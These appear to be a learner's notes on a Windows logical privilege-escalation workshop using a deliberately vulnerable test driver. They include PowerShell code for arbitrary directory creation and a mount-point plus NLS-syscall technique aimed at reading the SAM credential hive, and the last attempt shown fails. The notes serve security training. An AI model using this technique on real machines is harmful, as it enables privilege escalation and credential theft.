[sauce](https://googleprojectzero.blogspot.com/2017/08/windows-exploitation-tricks-arbitrary.html)

[materials](https://github.com/tyranid/windows-logical-eop-workshop)

[vuln driver](https://github.com/tyranid/windows-logical-eop-workshop/releases/download/BSIDES-LON-2017/release-20170606.zip)
```
# setup.txt

The following is the list of quick configuration steps you need to take to set up the various tools provided for this workshop. This assumes you’ve got a 32 bit install of Windows 10 Anniversary Edition (14393)

1) Unpack the archive to a directory in the root of the C drive, for example c:\workshop
2) From an admin command prompt run the following:

bcdedit /set TESTSIGNING ON

sc create workshop binPath= c:\workshop\driver\x64\LogicalEopWorkshopDriver.sys type= kernel start= demand

powershell -Command "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass"

5) Reboot the machine
6) Start the driver using ‘sc start workshop’. Check that it doesn’t print any errors.
```

[install NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/1.0.7)
```
Install-Module -Name NtObjectManager -RequiredVersion 1.0.7
```

[driver.c](https://github.com/tyranid/windows-logical-eop-workshop/blob/05f84282cb3b34d398ada0c653e5a0040b68fefe/LogicalEoPWorkshopDriver/driver.c#L168)
```
# The driver exposes a Device Object to the user with the name \Device\WorkshopDriver

NTSTATUS CreateDevice(PDRIVER_OBJECT DriverObject, LPCWSTR Name, DWORD Flags, PCUNICODE_STRING Sddl)

{
UNICODE_STRING DeviceName = { 0 };
UNICODE_STRING DosDeviceName = { 0 };
PDEVICE_OBJECT DeviceObject = NULL;
NTSTATUS status = STATUS_SUCCESS;
[...]

# All “vulnerabilities” are then exercised by sending Device IO Control requests to the device object.
```

[device_control.c , dispatch](https://github.com/tyranid/windows-logical-eop-workshop/blob/05f84282cb3b34d398ada0c653e5a0040b68fefe/LogicalEoPWorkshopDriver/device_control.c#L282)
```
# The code for the IO Control handling is in `device_control.c` and we’re specifically interested in the `dispatch`.
# The code `ControlCreateDir` is the one we’re looking for, it takes the input data from the user and uses that as an unchecked UNICODE_STRING to pass to the code to create the directory. 

case ControlCreateDir:
return CreateFile(&path, FALSE, TRUE);

# If we look up the code to create the IOCTL number we find `ControlCreateDir` is 2, so let’s use the following PS code to create an arbitrary directory.

at `device_control_ioctl.h`, `ControlCreateDir` is the third in the list - 0-1-2?

enum ControlCode
{
ControlCreateFile,
ControlCreateFileSecure,
ControlCreateDir,
ControlCreateDirSecure,
ControlCreateKey,
ControlCreateKeySecure,
ControlCreateKeyRelative,
ControlCallerIsElevated,
ControlCallerIsElevatedSecure,
ControlBadImpersonation,
ControlToggleProcessDebug,
ControlToggleIrpDebug,
ControlToggleRegistryDebug,
ControlRunIoTest,
};

#define IOCTL_BASE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define MAKE_IOCTL(x) (IOCTL_BASE | ((int)x << 2))
```

let’s use the following PS code to create an arbitrary directory
```powershell
# Get an IOCTL for the workshop driver.  
function Get-DriverIoCtl {  
   Param([int]$ControlCode)  
   [NtApiDotNet.NtIoControlCode]::new("Unknown",`  
       0x800 -bor $ControlCode, "Buffered", "Any")  
}  
  
function New-Directory {  
 Param([string]$Filename)  
 # Open the device driver.  
 Use-NtObject($file = Get-NtFile \Device\WorkshopDriver) {  
   # Get IOCTL for ControlCreateDir (2)  
   $ioctl = Get-DriverIoCtl -ControlCode 2  
   # Convert DOS filename to NT  
   $nt_filename = [NtApiDotNet.NtFileUtils]::DosFileNameToNt($Filename)  
   $bytes = [Text.Encoding]::Unicode.GetBytes($nt_filename)  
   $file.DeviceIoControl($ioctl, $bytes, 0) | Out-Null  
 }  
}
```
```
The New-Directory function first opens the device object, converts the path to a native NT format as an array of bytes and calls the DeviceIoControl function on the device.

We could just pass an integer value for control code but the NT API libraries I wrote have an NtIoControlCode type to pack up the values for you. Let’s try it and see if it works to create the directory c:\windows\abc.
```

create `c:\windows\abc` - first, cannot
```
PS C:\workshop> $dir = 'c:\windows\abc'
PS C:\workshop> new-item $dir -itemtype directory
new-item : Access to the path 'abc' is denied.
At line:1 char:1
+ new-item $dir -itemtype directory
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\windows\abc:String) [New-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CreateDirectoryUnauthorizedAccessError,Microsoft.PowerShell.Commands.NewItemCommand
```

create `c:\windows\abc` - with script, success
```
PS C:\workshop> . .\test.ps1
PS C:\workshop> new-directory $dir
PS C:\workshop> get-item $dir


    Directory: C:\windows


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         14/3/2023   5:26 pm                abc


PS C:\workshop> get-acl $dir | select-object owner

Owner
-----
DESKTOP-LP7TJ4T\user
```

```
It works and we’ve successfully created the arbitrary directory. Just to check we use Get-Acl to get the Security Descriptor of the directory and we can see that the owner is the ‘user’ account which means we can get full access to the directory.

Now the problem is what to do with this ability?

There’s no doubt some system service which might look up in a list of directories for an executable to run or a configuration file to parse. But it’d be nice not to rely on something like that. As the title suggested instead we’ll convert this into an arbitrary file read, how might do we go about doing that?
```

### Mount Point Abuse
```
If you’ve watched my talk on Abusing Windows Symbolic Links you’ll know how NTFS mount points (or sometimes Junctions) work. 

The $REPARSE_POINT NTFS attribute is stored with the Directory which the NTFS driver reads when opening a directory.

The attribute contains an alternative native NT object manager path to the destination of the symbolic link which is passed back to the IO manager to continue processing.

This allows the Mount Point to work between different volumes, but it does have one interesting consequence. Specifically the path doesn’t have to actually to point to another directory, what if we give it a path to a file?

If you use the Win32 APIs it will fail and if you use the NT apis directly you’ll find you end up in a weird paradox.

If you try and open the mount point as a file the error will say it’s a directory, and if you instead try to open as a directory it will tell you it’s really a file.

Turns out if you don’t specify either FILE_DIRECTORY_FILE or FILE_NON_DIRECTORY_FILE then the NTFS driver will pass its checks and the mount point can actually redirect to a file.

Perhaps we can find some system service which will open our file without any of these flags (if you pass FILE_FLAG_BACKUP_SEMANTICS to CreateFile this will also remove all flags) and ideally get the service to read and return the file data?
```

### National Language Support
```
Windows supports many different languages, and in order to support non-unicode encodings still supports Code Pages.

A lot is exposed through the National Language Support (NLS) libraries, and you’d assume that the libraries run entirely in user mode but if you look at the kernel you’ll find a few system calls here and there to support NLS.

The one of most interest to this blog is the `NtGetNlsSectionPtr` system call.

This system call maps code page files from the System32 directory into a process’ memory where the libraries can access the code page data.

It’s not entirely clear why it needs to be in kernel mode, perhaps it’s just to make the sections shareable between all processes on the same machine.

Let’s look at a simplified version of the code, it’s not a very big function:
```
```c
NTSTATUS NtGetNlsSectionPtr(DWORD NlsType,
                           DWORD CodePage,  
                           PVOID *SectionPointer,
                           PULONG SectionSize) {  
 UNICODE_STRING section_name;  
 OBJECT_ATTRIBUTES section_obj_attr;  
 HANDLE section_handle;  
 RtlpInitNlsSectionName(NlsType, CodePage, &section_name);  
 InitializeObjectAttributes(&section_obj_attr,
                            &section_name,  
                            OBJ_KERNEL_HANDLE |
                            OBJ_OPENIF |
                            OBJ_CASE_INSENSITIVE |
                            OBJ_PERMANENT);  

 // Open section under \NLS directory.  
 if (!NT_SUCCESS(ZwOpenSection(&section_handle,
                        SECTION_MAP_READ,
                        &section_obj_attr))) {  
   // If no section then open the corresponding file and create section.  
   UNICODE_STRING file_name;
   OBJECT_ATTRIBUTES obj_attr;  
   HANDLE file_handle;
   
   RtlpInitNlsFileName(NlsType,
                       CodePage,
                       &file_name);  
   InitializeObjectAttributes(&obj_attr,
                              &file_name,  
                              OBJ_KERNEL_HANDLE |
                              OBJ_CASE_INSENSITIVE);  
   ZwOpenFile(&file_handle, SYNCHRONIZE,
              &obj_attr, FILE_SHARE_READ, 0);  
   ZwCreateSection(&section_handle, FILE_MAP_READ,
                   &section_obj_attr, NULL,
                   PROTECT_READ_ONLY, MEM_COMMIT, file_handle);  
   ZwClose(file_handle);  
 }  
  
 // Map section into memory and return pointer.  
 NTSTATUS status = MmMapViewOfSection(
                     section_handle,  
                     SectionPointer,  
                     SectionSize);  
 ZwClose(section_handle);  
 return status;  
}
```
```
The first thing to note here is it tries to open a named section object under the `\NLS` directory using a name generated from the `CodePage` parameter. To get an idea what that name looks like we’ll just list that directory:

<admin powershell>
PS C:\workshop> . .\test.ps1
PS C:\workshop> gci NtObject:\Nls

Name                                     TypeName
----                                     --------
NlsSectionCP874                          Section
NlsSectionCP28591                        Section
NlsSectionCP936                          Section
NlsSectionCP950                          Section
NlsSectionCP1258                         Section
NlsSectionCP1254                         Section
NlsSectionCP949                          Section
NlsSectionCP1250                         Section
NlsSectionNORM0000000d                   Section
NlsSectionCP1255                         Section
NlsSectionCP1251                         Section
NlsSectionCP20127                        Section
NlsSectionCP1256                         Section
NlsSectionCP1257                         Section
NlsSectionCP932                          Section
NlsSectionCP1253                         Section
```
```
The named sections are of the form `NlsSectionCP<NUM>` where `NUM` is the number of the code page to map. You’ll also notice there’s a section for a normalization data set. Which file gets mapped depends on the first `NlsType` parameter, we don’t care about normalization for the moment.

If the section object isn’t found the code builds a file path to the code page file, opens it with `ZwOpenFile` and then calls `ZwCreateSection` to create a read-only named section object.

Finally the section is mapped into memory and returned to the caller.
```
```
There’s two important things to note here:

First the `OBJ_FORCE_ACCESS_CHECK` flag is not being set for the open call. This means the call will open any file even if the caller doesn’t have access to it.

And most importantly the final parameter of `ZwOpenFile` is `0`, this means neither `FILE_DIRECTORY_FILE` or `FILE_NON_DIRECTORY_FILE` is being set. Not setting these flags will result in our desired condition, the open call will follow the mount point redirection to a file and not generate an error. What is the file path set to? 

We can just disassemble `RtlpInitNlsFileName` to find out:

void RtlpInitNlsFileName(DWORD NlsType,
                        DWORD CodePage,
                        PUNICODE_STRING String) {  
 if (NlsType == NLS_CODEPAGE) {  
    RtlStringCchPrintfW(String,
             L"\\SystemRoot\\System32\\c_%.3d.nls", CodePage);  
 } else {  
    // Get normalization path from registry.  
    // NOTE about how this is arbitrary registry write to file.  
 }  
}
```
```
The file is of the form `c_<NUM>.nls` under the System32 directory. 

Note that it uses the special symbolic link `\SystemRoot` which points to the `Windows` directory using a device path format. This prevents this code from being abused by redirecting drive letters and making it an actual vulnerability. 

Also note that if the normalization path is requested the information is read out from a machine registry key, so if you have an arbitrary registry value writing vulnerability you might be able to exploit this system call to get another arbitrary read, but that’s for the interested reader to investigate.
```
```
I think it’s clear now what we have to do, create a directory in System32 with the name `c_<NUM>.nls`, set its reparse data to point to an arbitrary file then use the NLS system call to open and map the file.

Choosing a code page number is easy, 1337 is unused. But what file should we read?

A common file to read is the SAM registry hive which contains logon information for local users. However access to the SAM file is usually blocked as it’s not sharable and even just opening for read access as an administrator will fail with a sharing violation. 

There’s of course a number of ways you can get around this, you can use the registry backup functions (but that needs admin rights) or we can pull an old copy of the SAM from a Volume Shadow Copy (which isn’t on by default on Windows 10). So perhaps let’s forget about… no wait we’re in luck.
```
```
File sharing on Windows files depends on the access being requested. For example if the caller requests Read access but the file is not shared for read access then it fails. 

However it’s possible to open a file for certain non-content rights, such as reading the security descriptor or synchronizing on the file object, rights which are not considered when checking the existing file sharing settings.

If you look back at the code for `NtGetNlsSectionPtr` you’ll notice the only access right being requested for the file is SYNCHRONIZE and so will always allow the file to be opened even if locked with no sharing access.
```
```
But how can that work? Doesn’t `ZwCreateSection` need a readable file handle to do the read-only file mapping?

Yes and no. Windows file objects do not really care whether a file is readable or writable. Access rights are associated with the handle created when the file is opened. 

When you call `ZwCreateSection` from user-mode the call eventually tries to convert the handle to a pointer to the file object. For that to occur the caller must specify what access rights need to be on the handle for it to succeed, for a read-only mapping the kernel requests the handle has Read Data access.

However just as with access checking with files if the kernel calls `ZwCreateSection` access checking is disabled including when converting a file handle to the file object pointer. This results in `ZwCreateSection` succeeding even though the file handle only has SYNCHRONIZE access. Which means we can open any file on the system regardless of it’s sharing mode and that includes the SAM file.

So let’s put the final touches to this, we create the directory `\SystemRoot\System32\c_1337.nls` and convert it to a mount point which redirects to `\SystemRoot\System32\config\SAM`. 

Then we call `NtGetNlsSectionPtr` requesting code page 1337, which creates the section and returns us a pointer to it.

Finally we just copy out the mapped file memory into a new file and we’re done.
```
(append to earlier ps1 chunk)
```powershell
$dir = "\SystemRoot\system32\c_1337.nls"  
New-Directory $dir  
   
$target_path = "\SystemRoot\system32\config\SAM"  
Use-NtObject($file = Get-NtFile $dir `
            -Options OpenReparsePoint,DirectoryFile) {  
 $file.SetMountPoint($target_path, $target_path)  
}
  
Use-NtObject($map =
    [NtApiDotNet.NtLocale]::GetNlsSectionPtr("CodePage", 1337)) {  
 Use-NtObject($output = [IO.File]::OpenWrite("sam.bin")) {  
   $map.GetStream().CopyTo($output)  
   Write-Host "Copied file"  
 }  
}
```

hmm.. no longer works?
```
PS C:\workshop> gi C:\Windows\System32\c_1337.nls\


    Directory: C:\Windows\System32


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----l         14/3/2023   6:16 pm                c_1337.nls


PS C:\workshop> $target_path = "\SystemRoot\system32\config\SAM"
PS C:\workshop> Use-NtObject($file = Get-NtFile $dir -Options OpenReparsePoint,DirectoryFile) {
>>   $file.SetMountPoint($target_path, $target_path)
>> }
Get-NtFile : Relative paths with no Root directory are not allowed.
At line:1 char:22
+ ... ect($file = Get-NtFile $dir -Options OpenReparsePoint,DirectoryFile)  ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-NtFile], ArgumentException
    + FullyQualifiedErrorId : System.ArgumentException,NtObjectManager.GetNtFileCmdlet

# re-try using absolute path

PS C:\workshop> $target_path = "c:\windows\system32\config\SAM"
PS C:\workshop> Use-NtObject($file = Get-NtFile $dir -Options OpenReparsePoint,DirectoryFile) {
>>   $file.SetMountPoint($target_path, $target_path)
>> }
Get-NtFile : Relative paths with no Root directory are not allowed.
At line:1 char:22
+ ... ect($file = Get-NtFile $dir -Options OpenReparsePoint,DirectoryFile)  ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-NtFile], ArgumentException
    + FullyQualifiedErrorId : System.ArgumentException,NtObjectManager.GetNtFileCmdlet
```
